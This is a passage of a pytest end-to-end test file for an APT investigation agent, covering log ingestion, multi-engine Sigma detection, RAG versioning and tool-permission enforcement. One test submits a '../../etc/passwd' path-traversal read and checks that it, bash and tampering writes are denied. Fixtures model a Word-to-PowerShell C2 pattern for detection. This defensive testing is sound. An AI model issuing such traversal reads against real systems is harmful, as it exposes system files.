"""Tier 3 E2E tests: pairwise cross-feature integration across F01-F15.

All ``apt_agent`` imports are kept lazy inside test functions so collection,
syntax validation, and M1/M2 live verification succeed independently of M3-M6.
"""

from __future__ import annotations

import inspect
import json
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

import _helpers

pytestmark = pytest.mark.tier3


def _field(obj: Any, *names: str, default: Any = None) -> Any:
    for name in names:
        if isinstance(obj, dict) and name in obj:
            return obj[name]
        if not isinstance(obj, dict) and hasattr(obj, name):
            return getattr(obj, name)
    return default


def _error_code(res: Any) -> str | None:
    err = _field(res, "error")
    if isinstance(err, dict):
        return err.get("code")
    if err is not None:
        return _field(err, "code")
    return _field(res, "error_code")


def _audit_allowed(entry: Any) -> bool | None:
    allowed = _field(entry, "allowed")
    if isinstance(allowed, bool):
        return allowed
    ok = _field(entry, "ok")
    if isinstance(ok, bool):
        return ok
    decision = _field(entry, "decision", "status")
    if isinstance(decision, str):
        low = decision.lower()
        if low in {"allow", "allowed", "success"}:
            return True
        if low in {"deny", "denied", "error", "rejected"}:
            return False
    return None


def _unwrap_verified_state(ver: Any) -> Any:
    return ver["verified_state"] if isinstance(ver, dict) else ver.verified_state


def _make_rag_service(cfg: Any) -> Any:
    from apt_agent.tools import RagService

    try:
        return RagService(cfg)
    except (TypeError, ValueError):
        return RagService(config=cfg.rag)


# ---------------------------------------------------------------------------
# T3-01: F01 x F15 (M1-liveable)
# ---------------------------------------------------------------------------
def test_t3_01_f01_f15_external_config_binds_isolated_run_contexts(
    tmp_path: Path,
    make_app_config,
    make_run_context,
    e2e_fixtures_dir: Path,
) -> None:
    from apt_agent.config import load_config
    from apt_agent.models import Locator

    kb_v1 = e2e_fixtures_dir / "kb" / "kb_v1.jsonl"
    kb_v2 = e2e_fixtures_dir / "kb" / "kb_v2.jsonl"
    snaps_a = tmp_path / "snaps_a"
    snaps_b = tmp_path / "snaps_b"

    yaml_path = tmp_path / "custom.yaml"
    yaml_path.write_text(
        "\n".join(
            [
                "llm:",
                "  enabled: false",
                "rag:",
                f'  knowledge_path: "{kb_v1}"',
                '  mode: "bm25"',
                "  offline: true",
                "budget:",
                "  max_rounds: 2",
                "  reserve_ratio: 0.8",
                "",
            ]
        ),
        encoding="utf-8",
    )

    cfg_a = load_config(
        config_path=yaml_path,
        overrides={"snapshots": {"root_dir": str(snaps_a)}},
    )
    cfg_b = make_app_config(
        base_dir=tmp_path / "b",
        knowledge_path=kb_v2,
        snapshots_dir=snaps_b,
        budget_overrides={"max_rounds": 4},
    )

    ctx_a = make_run_context(
        case_id="case-a",
        run_id="run-a",
        data_snapshot_id="data-v1",
        mapping_version="map-v1",
        ruleset_version="rules-v1",
        knowledge_snapshot_id="kb-v1",
        config=cfg_a,
        valid_physical_ids={"pr-1"},
        locator_map={"pr-1": Locator(filepath="data/H1/ecar.json", linenumber=1)},
    )
    ctx_b = make_run_context(
        case_id="case-b",
        run_id="run-b",
        data_snapshot_id="data-v2",
        mapping_version="map-v2",
        ruleset_version="rules-v2",
        knowledge_snapshot_id="kb-v2",
        config=cfg_b,
        valid_physical_ids={"pr-2"},
    )

    assert cfg_a.budget.max_rounds == 2
    assert cfg_b.budget.max_rounds == 4
    assert cfg_a.budget.reserve_ratio == pytest.approx(0.8)
    assert str(cfg_a.rag.knowledge_path) != str(cfg_b.rag.knowledge_path)
    assert str(cfg_a.snapshots.root_dir) != str(cfg_b.snapshots.root_dir)

    assert ctx_a.case_id != ctx_b.case_id
    assert ctx_a.run_id != ctx_b.run_id
    assert ctx_a.mapping_version == "map-v1"
    assert ctx_b.mapping_version == "map-v2"
    assert ctx_a.ruleset_version == "rules-v1"
    assert ctx_b.ruleset_version == "rules-v2"
    assert ctx_a.knowledge_snapshot_id == "kb-v1"
    assert ctx_b.knowledge_snapshot_id == "kb-v2"

    with pytest.raises((ValidationError, TypeError, AttributeError)):
        ctx_a.ruleset_version = "rules-v99"  # type: ignore[misc]


# ---------------------------------------------------------------------------
# T3-02: F02 x F03 (M2-liveable)
# ---------------------------------------------------------------------------
def test_t3_02_f02_f03_ingestion_normalization_unknown_fields_and_blank_lines(
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_run_context,
) -> None:
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Locator

    logs_dir = e2e_fixtures_dir / "logs"
    index_main, recs_main = load_scene_records(logs_dir)
    blank_index = json.loads(
        (logs_dir / "Label_Index_blank_line.json").read_text(encoding="utf-8")
    )
    blank_recs = [(pid, {"raw_text": ""}) for pid in blank_index]

    merged_index = {**index_main, **blank_index}
    combined_records = list(recs_main) + blank_recs
    locator_map = {pid: Locator(**meta) for pid, meta in merged_index.items()}

    ctx = make_run_context(
        case_id="case-t3-02",
        run_id="run-t3-02",
        valid_physical_ids=set(merged_index.keys()),
        locator_map=locator_map,
    )

    gen = (rec for rec in combined_records)
    store = ingest_records(
        gen,
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    assert list(gen) == []

    fetched, missing = store.fetch_raw_evidence(
        ["pr-000000000000000000000003", "pr-900000000000000000000001"]
    )
    assert missing == []
    assert len(fetched) == 2
    for raw_rec in fetched:
        raw_pid = getattr(raw_rec, "physical_record_id", None) or getattr(raw_rec, "raw_id", None)
        assert raw_pid in {"pr-000000000000000000000003", "pr-900000000000000000000001"}
        if hasattr(raw_rec, "raw_id") and hasattr(raw_rec, "physical_record_id"):
            assert raw_rec.raw_id == raw_rec.physical_record_id

    norm = Normalizer()
    res1 = norm.normalize_batch(ctx, store)
    res2 = norm.normalize_batch(ctx, store)

    ids1 = [ev.event_id for ev in res1.events]
    ids2 = [ev.event_id for ev in res2.events]
    assert ids1 == ids2
    assert len(ids1) == len(set(ids1))
    assert len(res1.events) > 0

    for ev in res1.events:
        ev_pid = getattr(ev, "physical_record_id", None) or getattr(ev, "raw_id", None)
        assert ev_pid in merged_index
        recs, miss = store.fetch_raw_evidence([ev_pid])
        assert miss == []
        assert len(recs) == 1

    # Blank lines yield 0 events and record parse gaps without raising
    blank_raw_list, blank_miss = store.fetch_raw_evidence(list(blank_index.keys()))
    assert blank_miss == []
    for blank_raw in blank_raw_list:
        single_out = norm.normalize(ctx, blank_raw)
        assert single_out["events"] == []
        assert len(single_out["gaps"]) >= 1

    # Unknown field custom_sensor_flag preserved on pr-000000000000000000000003 (ecar.json:4)
    pr3_events = [
        ev
        for ev in res1.events
        if (getattr(ev, "physical_record_id", None) or getattr(ev, "raw_id", None))
        == "pr-000000000000000000000003"
    ]
    assert len(pr3_events) >= 1
    assert any(
        "unmapped_v2" in json.dumps(ev.model_dump(), ensure_ascii=False)
        for ev in pr3_events
    )

    # All 16 log types represented across source_type_counts / normalized events
    source_types = set(res1.source_type_counts.keys()) | {
        ev.source_type for ev in res1.events if getattr(ev, "source_type", None)
    }
    assert len(source_types) >= 16


# ---------------------------------------------------------------------------
# T3-03: F01 x F02 (M1+M2-liveable)
# ---------------------------------------------------------------------------
def test_t3_03_f01_f02_cross_case_store_isolation_and_snapshot_bindings(
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_run_context,
) -> None:
    from apt_agent.ingestion import ingest_records
    from apt_agent.models import Locator

    index, records = load_scene_records(e2e_fixtures_dir / "logs")
    records_a = records[:10]
    records_b = records[10:20]
    pids_a = {pid for pid, _ in records_a}
    pids_b = {pid for pid, _ in records_b}

    loc_a = {pid: Locator(**index[pid]) for pid in pids_a}
    loc_b = {pid: Locator(**index[pid]) for pid in pids_b}

    ctx_a = make_run_context(
        case_id="case-iso-A",
        run_id="run-iso-A",
        data_snapshot_id="snap-A",
        valid_physical_ids=pids_a,
        locator_map=loc_a,
    )
    ctx_b = make_run_context(
        case_id="case-iso-B",
        run_id="run-iso-B",
        data_snapshot_id="snap-B",
        valid_physical_ids=pids_b,
        locator_map=loc_b,
    )

    store_a = ingest_records(
        iter(records_a),
        case_id=ctx_a.case_id,
        run_id=ctx_a.run_id,
        locator_map=loc_a,
    )
    store_b = ingest_records(
        iter(records_b),
        case_id=ctx_b.case_id,
        run_id=ctx_b.run_id,
        locator_map=loc_b,
    )

    pid_a0 = records_a[0][0]
    pid_b0 = records_b[0][0]

    found_a, missing_a = store_a.fetch_raw_evidence([pid_a0, pid_b0])
    assert len(found_a) == 1
    assert (
        getattr(found_a[0], "physical_record_id", None) or getattr(found_a[0], "raw_id", None)
    ) == pid_a0
    assert missing_a == [pid_b0]

    found_b, missing_b = store_b.fetch_raw_evidence([pid_a0])
    assert found_b == []
    assert missing_b == [pid_a0]

    assert ctx_a.data_snapshot_id != ctx_b.data_snapshot_id
    assert pid_b0 not in ctx_a.valid_physical_ids
    assert pid_a0 not in ctx_b.valid_physical_ids


# ---------------------------------------------------------------------------
# T3-04: F03 x F04
# ---------------------------------------------------------------------------
def test_t3_04_f03_f04_multiformat_normalized_events_route_to_all_engines(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Locator

    index, records = load_scene_records(e2e_fixtures_dir / "logs")
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(
        base_dir=tmp_path,
        rules_dir=e2e_fixtures_dir / "rules" / "valid",
    )
    ctx = make_run_context(
        case_id="case-t3-04",
        run_id="run-t3-04",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)

    det = DetectionCoordinator(cfg).detect(
        ctx,
        norm.events,
        ruleset_version=ctx.ruleset_version,
    )

    hits = det["hits"]
    coverage = det["coverage"]
    assert len(hits) > 0
    assert len(coverage) > 0

    for rr in coverage:
        assert rr.status in {"ran", "partial", "skipped"}, f"Unexpected failed RuleRun: {rr}"
        if rr.status == "skipped":
            assert bool(rr.reason), f"Skipped RuleRun missing reason: {rr}"

    for eng in ("zircolite", "hayabusa", "rsigma", "chainsaw", "pysigma"):
        eng_runs = [rr for rr in coverage if rr.engine == eng]
        assert eng_runs and any(rr.status in {"ran", "partial"} for rr in eng_runs), (
            f"Expected at least one ran/partial RuleRun for {eng}, got {eng_runs!r}"
        )
    taka_runs = [rr for rr in coverage if rr.engine == "takajo"]
    assert all(rr.status != "failed" for rr in taka_runs)

    event_to_pid = {
        ev.event_id: (getattr(ev, "physical_record_id", None) or getattr(ev, "raw_id", None))
        for ev in norm.events
    }
    valid_event_ids = set(event_to_pid.keys())

    matched_rule_ids = {h.rule_id for h in hits}
    assert "11111111-2222-3333-4444-555555555501" in matched_rule_ids
    assert any(
        rid in matched_rule_ids
        for rid in (
            "11111111-2222-3333-4444-555555555504",
            "11111111-2222-3333-4444-555555555505",
            "11111111-2222-3333-4444-555555555506",
            "11111111-2222-3333-4444-555555555507",
            "11111111-2222-3333-4444-555555555508",
        )
    )

    for hit in hits:
        if hit.event_ids:
            assert set(hit.event_ids) <= valid_event_ids
            for eid in hit.event_ids:
                assert event_to_pid[eid] in index


# ---------------------------------------------------------------------------
# T3-05: F04 x F05
# ---------------------------------------------------------------------------
def test_t3_05_f04_f05_multi_engine_hit_dedup_and_partial_failure_coverage(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Locator

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(
        base_dir=tmp_path,
        engine_modes={
            "hayabusa": "crash",
            "chainsaw": "zero_hit",
            "zircolite": "normal",
            "rsigma": "normal",
        },
        enabled_engines=("zircolite", "hayabusa", "rsigma", "chainsaw"),
        rules_dir=e2e_fixtures_dir / "rules" / "valid",
    )
    ctx = make_run_context(
        case_id="case-t3-05",
        run_id="run-t3-05",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)

    det = DetectionCoordinator(cfg).detect(ctx, norm.events)
    coverage = det["coverage"]
    hits = det["hits"]

    hayabusa_runs = [rr for rr in coverage if rr.engine == "hayabusa"]
    assert hayabusa_runs and all(rr.status == "failed" and bool(rr.reason) for rr in hayabusa_runs)

    for eng in ("zircolite", "rsigma", "chainsaw"):
        eng_runs = [rr for rr in coverage if rr.engine == eng]
        assert eng_runs and any(rr.status == "ran" for rr in eng_runs)

    # Per-engine Hit deduplication preserving multi-engine rule sources (matches Tier 1/2 F05)
    event_to_pid = {
        ev.event_id: (getattr(ev, "physical_record_id", None) or getattr(ev, "raw_id", None))
        for ev in norm.events
    }
    seen_triples: set[tuple[str, str, str]] = set()
    for hit in hits:
        assert len(hit.event_ids) == len(set(hit.event_ids))
        for eid in hit.event_ids:
            triple = (hit.engine, hit.rule_id, eid)
            assert triple not in seen_triples, f"Duplicate (engine, rule_id, event_id) hit: {triple}"
            seen_triples.add(triple)
            assert event_to_pid[eid] in index

    ww_hits = [h for h in hits if h.rule_id == "11111111-2222-3333-4444-555555555501"]
    assert len(ww_hits) >= 2
    assert {"zircolite", "rsigma"} <= {h.engine for h in ww_hits}


# ---------------------------------------------------------------------------
# T3-06: F05 x F15
# ---------------------------------------------------------------------------
def test_t3_06_f05_f15_config_disabled_and_missing_binary_drive_coverage_states(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Locator

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(
        base_dir=tmp_path,
        enabled_engines=("zircolite", "rsigma"),
        overrides={
            "engines": {
                "zircolite": {
                    "bin_path": str(tmp_path / "missing" / "zircolite_absent"),
                }
            }
        },
    )
    ctx = make_run_context(
        case_id="case-t3-06",
        run_id="run-t3-06",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)

    det = DetectionCoordinator(cfg).detect(ctx, norm.events)
    coverage = det["coverage"]
    hits = det["hits"]

    zirc_runs = [rr for rr in coverage if rr.engine == "zircolite"]
    assert zirc_runs and all(rr.status == "skipped" and bool(rr.reason) for rr in zirc_runs)

    for disabled_eng in ("hayabusa", "takajo", "chainsaw", "pysigma"):
        disabled_runs = [rr for rr in coverage if rr.engine == disabled_eng]
        assert all(rr.status == "skipped" for rr in disabled_runs)

    rsigma_runs = [rr for rr in coverage if rr.engine == "rsigma"]
    assert rsigma_runs and any(rr.status == "ran" for rr in rsigma_runs)

    event_to_pid = {
        ev.event_id: (getattr(ev, "physical_record_id", None) or getattr(ev, "raw_id", None))
        for ev in norm.events
    }
    assert any(
        event_to_pid[eid] in index
        for hit in hits
        for eid in hit.event_ids
    )


# ---------------------------------------------------------------------------
# T3-07: F06 x F08
# ---------------------------------------------------------------------------
def test_t3_07_f06_f08_rag_query_vs_forensic_query_provenance_isolation(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Locator
    from apt_agent.tools import ToolRegistry

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(
        base_dir=tmp_path,
        knowledge_path=e2e_fixtures_dir / "kb" / "synthetic_kb.jsonl",
    )
    ctx = make_run_context(
        case_id="case-t3-07",
        run_id="run-t3-07",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)

    rag = _make_rag_service(cfg)
    registry = ToolRegistry(ctx, store, norm.events, rag, workspace_root=tmp_path)

    rag_res = registry.invoke(
        "host",
        "search_knowledge",
        {"query": "WINWORD powershell ProcessGuid"},
        case_id=ctx.case_id,
        task_id="task-1",
    )
    assert _field(rag_res, "ok", default=True) is True
    rag_payload = _field(rag_res, "data", default=rag_res)
    rag_ev_ids = (
        rag_payload.get("evidence_ids")
        if isinstance(rag_payload, dict) and "evidence_ids" in rag_payload
        else _field(rag_res, "evidence_ids", default=[])
    )
    assert rag_ev_ids == []
    chunk_ids = {
        _field(ref, "chunk_id") for ref in _field(rag_payload, "refs", default=[])
    }
    assert "kb-playbook-e41-pivot" in chunk_ids

    ev_p1 = registry.invoke(
        "host",
        "query_events",
        {"filters": {}, "limit": 2},
        case_id=ctx.case_id,
        task_id="task-1",
    )
    assert _field(ev_p1, "ok", default=True) is True
    p1_data = _field(ev_p1, "data", default=ev_p1)
    p1_events = _field(p1_data, "events", default=[])
    assert len(p1_events) == 2
    p1_qid = _field(p1_data, "query_id")
    assert p1_qid
    cursor = _field(p1_data, "next_cursor")
    assert cursor is not None

    all_events = list(p1_events)
    query_ids = [p1_qid]
    while cursor is not None:
        ev_next = registry.invoke(
            "host",
            "query_events",
            {"filters": {}, "limit": 10, "cursor": cursor},
            case_id=ctx.case_id,
            task_id="task-1",
        )
        assert _field(ev_next, "ok", default=True) is True
        next_data = _field(ev_next, "data", default=ev_next)
        all_events.extend(_field(next_data, "events", default=[]))
        query_ids.append(_field(next_data, "query_id"))
        cursor = _field(next_data, "next_cursor")

    assert len(query_ids) == len(set(query_ids))
    assert len(all_events) == len(norm.events)
    retrieval_id = _field(rag_payload, "retrieval_id")
    assert retrieval_id not in query_ids


# ---------------------------------------------------------------------------
# T3-08: F08 x F13
# ---------------------------------------------------------------------------
def test_t3_08_f08_f13_registry_role_and_scope_enforcement_on_forensic_and_base_tools(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Locator
    from apt_agent.tools import ToolRegistry

    artifact = tmp_path / "notes.txt"
    artifact.write_text("case note", encoding="utf-8")

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(base_dir=tmp_path)
    ctx = make_run_context(
        case_id="case-t3-08",
        run_id="run-t3-08",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)
    registry = ToolRegistry(
        ctx, store, norm.events, _make_rag_service(cfg), workspace_root=tmp_path
    )

    ok_read = registry.invoke(
        "host",
        "read",
        {"path": str(artifact)},
        case_id=ctx.case_id,
    )
    assert _field(ok_read, "ok") is True
    read_data = _field(ok_read, "data", default=ok_read)
    assert "case note" in json.dumps(read_data, default=str, ensure_ascii=False)

    ok_fetch = registry.invoke(
        "host",
        "fetch_raw_evidence",
        {"physical_ids": ["pr-s01-0001"]},
        case_id=ctx.case_id,
    )
    assert _field(ok_fetch, "ok") is True
    fetch_data = _field(ok_fetch, "data", default=ok_fetch)
    assert len(_field(fetch_data, "records", default=[])) == 1

    # Denied base mutating/exec tools for investigation role
    for denied_tool, args in (
        ("write", {"path": str(tmp_path / "x.txt"), "content": "x"}),
        ("edit", {"path": str(artifact), "old_text": "case", "new_text": "tamper"}),
        ("bash", {"command": "echo hi"}),
    ):
        res = registry.invoke("host", denied_tool, args, case_id=ctx.case_id)
        assert _field(res, "ok") is False
        assert _error_code(res) in {"PERMISSION_DENIED", "OUT_OF_SCOPE"}

    assert not (tmp_path / "x.txt").exists()
    assert artifact.read_text(encoding="utf-8") == "case note"

    # Cross-case fetch denied
    cross_res = registry.invoke(
        "host",
        "fetch_raw_evidence",
        {"physical_ids": ["pr-s01-0001"]},
        case_id="other-case",
    )
    assert _field(cross_res, "ok") is False
    assert _error_code(cross_res) == "OUT_OF_SCOPE"

    # Path traversal read denied
    trav_res = registry.invoke(
        "host",
        "read",
        {"path": "../../etc/passwd"},
        case_id=ctx.case_id,
    )
    assert _field(trav_res, "ok") is False
    assert _error_code(trav_res) in {"OUT_OF_SCOPE", "PERMISSION_DENIED"}

    # Out-of-window query_events check
    oow_res = registry.invoke(
        "host",
        "query_events",
        {"filters": {}, "limit": 10},
        case_id=ctx.case_id,
        event_time_window=("2020-01-01T00:00:00Z", "2020-01-01T01:00:00Z"),
    )
    if _field(oow_res, "ok"):
        oow_data = _field(oow_res, "data", default=oow_res)
        assert _field(oow_data, "events", default=[]) == []
    else:
        assert _error_code(oow_res) == "OUT_OF_SCOPE"

    assert len(registry.audit_log) >= 5
    denied_entries = [
        entry for entry in registry.audit_log if _audit_allowed(entry) is False
    ]
    assert len(denied_entries) >= 5


# ---------------------------------------------------------------------------
# T3-09: F06 x F13
# ---------------------------------------------------------------------------
def test_t3_09_f06_f13_rag_version_filter_and_maintenance_sandbox_boundaries(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Locator
    from apt_agent.tools import ToolRegistry

    snapshots_dir = tmp_path / "snapshots"
    snapshots_dir.mkdir(parents=True, exist_ok=True)
    draft_dir = tmp_path / "drafts"
    draft_dir.mkdir(parents=True, exist_ok=True)

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_08_maintenance"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(
        base_dir=tmp_path,
        knowledge_path=e2e_fixtures_dir / "kb" / "synthetic_kb.jsonl",
        snapshots_dir=snapshots_dir,
    )
    ctx = make_run_context(
        case_id="case-t3-09",
        run_id="run-t3-09",
        knowledge_snapshot_id="v1",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)
    reg_params = inspect.signature(ToolRegistry).parameters
    reg_kwargs: dict[str, Any] = {"workspace_root": draft_dir}
    if "draft_sandbox_root" in reg_params:
        reg_kwargs["draft_sandbox_root"] = draft_dir
    if "protected_roots" in reg_params:
        reg_kwargs["protected_roots"] = [snapshots_dir]
    registry = ToolRegistry(
        ctx,
        store,
        norm.events,
        _make_rag_service(cfg),
        **reg_kwargs,
    )

    rag_v1 = registry.invoke(
        "rule_agent",
        "search_knowledge",
        {"query": "creator_pid endpoint_sensor", "filters": {"version": "v1"}},
        case_id=ctx.case_id,
    )
    rag_v2 = registry.invoke(
        "rule_agent",
        "search_knowledge",
        {"query": "creator_pid endpoint_sensor", "filters": {"version": "v2"}},
        case_id=ctx.case_id,
    )
    assert _field(rag_v1, "ok") is True and _field(rag_v2, "ok") is True
    d1 = _field(rag_v1, "data", default=rag_v1)
    d2 = _field(rag_v2, "data", default=rag_v2)
    ev1 = (
        d1.get("evidence_ids")
        if isinstance(d1, dict) and "evidence_ids" in d1
        else _field(rag_v1, "evidence_ids", default=[])
    )
    ev2 = (
        d2.get("evidence_ids")
        if isinstance(d2, dict) and "evidence_ids" in d2
        else _field(rag_v2, "evidence_ids", default=[])
    )
    assert ev1 == []
    assert ev2 == []

    v1_ids = {_field(r, "chunk_id") for r in _field(d1, "refs", default=[])}
    v2_ids = {_field(r, "chunk_id") for r in _field(d2, "refs", default=[])}
    assert "kb-sensor-v1-creator-pid" in v1_ids
    assert "kb-sensor-v2-creator-pid" not in v1_ids
    assert "kb-sensor-v2-creator-pid" in v2_ids
    assert "kb-sensor-v1-creator-pid" not in v2_ids

    ok_write = registry.invoke(
        "rule_agent",
        "write",
        {"path": str(draft_dir / "candidate_rule.yml"), "content": "title: test\n"},
        case_id=ctx.case_id,
    )
    assert _field(ok_write, "ok") is True
    assert (draft_dir / "candidate_rule.yml").is_file()

    tamper_target = snapshots_dir / "v1" / "tamper.yml"
    denied_write = registry.invoke(
        "rule_agent",
        "write",
        {"path": str(tamper_target), "content": "bad"},
        case_id=ctx.case_id,
    )
    assert _field(denied_write, "ok") is False
    assert _error_code(denied_write) in {"OUT_OF_SCOPE", "PERMISSION_DENIED"}
    assert not tamper_target.exists()
    assert any(
        _field(entry, "tool_name", "tool") == "write"
        and _audit_allowed(entry) is False
        for entry in registry.audit_log
    )


# ---------------------------------------------------------------------------
# T3-10: F04 x F14
# ---------------------------------------------------------------------------
def test_t3_10_f04_f14_validate_candidate_engine_compile_and_correlation_replay(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.maintenance import validate_candidate

    cfg = make_app_config(base_dir=tmp_path)
    ctx = make_run_context(case_id="case-t3-10", run_id="run-t3-10", config=cfg)

    valid_single_yaml = (
        e2e_fixtures_dir / "rules" / "valid" / "win_winword_powershell.yml"
    ).read_text(encoding="utf-8")
    valid_corr_yaml = (
        e2e_fixtures_dir / "rules" / "correlation" / "winword_ps_c2_temporal.yml"
    ).read_text(encoding="utf-8")
    bad_syntax_yaml = (
        e2e_fixtures_dir / "rules" / "invalid" / "bad_syntax.yml"
    ).read_text(encoding="utf-8")
    bad_corr_yaml = (
        e2e_fixtures_dir / "rules" / "invalid" / "bad_correlation.yml"
    ).read_text(encoding="utf-8")

    pos_proc = {
        "event_id": "ev-pos-1",
        "raw_id": "pr-pos-1",
        "@timestamp": "2024-05-30T10:00:00.123Z",
        "Computer": "H1.example.local",
        "ProcessGuid": "G7",
        "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    }
    pos_flow = {
        "event_id": "ev-pos-2",
        "raw_id": "pr-pos-2",
        "@timestamp": "2024-05-30T10:00:03.000Z",
        "Computer": "H1.example.local",
        "ProcessGuid": "G7",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "DestinationIp": "203.0.113.8",
        "DestinationPort": 443,
    }
    neg_benign = {
        "event_id": "ev-neg-1",
        "raw_id": "pr-neg-1",
        "@timestamp": "2024-05-30T10:05:00.000Z",
        "Computer": "H1.example.local",
        "ProcessGuid": "G-BENIGN",
        "ParentImage": r"C:\Windows\explorer.exe",
        "Image": r"C:\Windows\System32\notepad.exe",
    }

    fixtures_single = {"positive": [pos_proc], "negative": [neg_benign]}
    fixtures_corr = {
        "positive": [pos_proc, pos_flow],
        "negative": [neg_benign],
        "base_rules": [
            valid_single_yaml,
            (e2e_fixtures_dir / "rules" / "valid" / "win_powershell_c2_flow.yml").read_text(
                encoding="utf-8"
            ),
        ],
    }

    res_single = validate_candidate(ctx, "sigma_rule", valid_single_yaml, fixtures_single)
    assert _field(res_single, "passed") is True
    assert isinstance(_field(res_single, "stage_results"), dict)
    assert len(_field(res_single, "stage_results")) >= 1
    assert isinstance(_field(res_single, "replay_diff"), dict)

    res_corr = validate_candidate(ctx, "sigma_rule", valid_corr_yaml, fixtures_corr)
    assert _field(res_corr, "passed") is True
    assert isinstance(_field(res_corr, "stage_results"), dict)
    assert isinstance(_field(res_corr, "replay_diff"), dict)

    res_bad_syntax = validate_candidate(ctx, "sigma_rule", bad_syntax_yaml, fixtures_single)
    assert _field(res_bad_syntax, "passed") is False
    assert len(_field(res_bad_syntax, "diagnostics", default=[])) >= 1

    res_bad_corr = validate_candidate(ctx, "sigma_rule", bad_corr_yaml, fixtures_corr)
    assert _field(res_bad_corr, "passed") is False
    assert len(_field(res_bad_corr, "diagnostics", default=[])) >= 1


# ---------------------------------------------------------------------------
# T3-11: F01 x F14
# ---------------------------------------------------------------------------
def test_t3_11_f01_f14_snapshot_immutability_and_mapping_validation_across_versions(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.maintenance import SnapshotRegistry, validate_candidate

    cfg = make_app_config(base_dir=tmp_path, snapshots_dir=tmp_path / "snapshots")
    reg = SnapshotRegistry(tmp_path / "snapshots")

    baseline_map_text = (
        Path(__file__).resolve().parents[2]
        / "script"
        / "log_convert"
        / "configs"
        / "zircolite_config.yaml"
    ).read_text(encoding="utf-8")
    baseline_rule_text = (
        e2e_fixtures_dir / "rules" / "valid" / "win_winword_powershell.yml"
    ).read_text(encoding="utf-8")

    snap_v1 = reg.publish_snapshot(
        "mapping",
        "v1",
        {"zircolite_config.yaml": baseline_map_text},
        {"author": "test"},
    )
    reg.publish_snapshot(
        "ruleset",
        "v1",
        {"win_winword_powershell.yml": baseline_rule_text},
        {"author": "test"},
    )

    ctx_v1 = make_run_context(
        case_id="case-live-1",
        run_id="run-1",
        mapping_version="v1",
        ruleset_version="v1",
        config=cfg,
    )

    mapping_samples = json.loads(
        (e2e_fixtures_dir / "rules" / "mappings" / "mapping_samples.json").read_text(
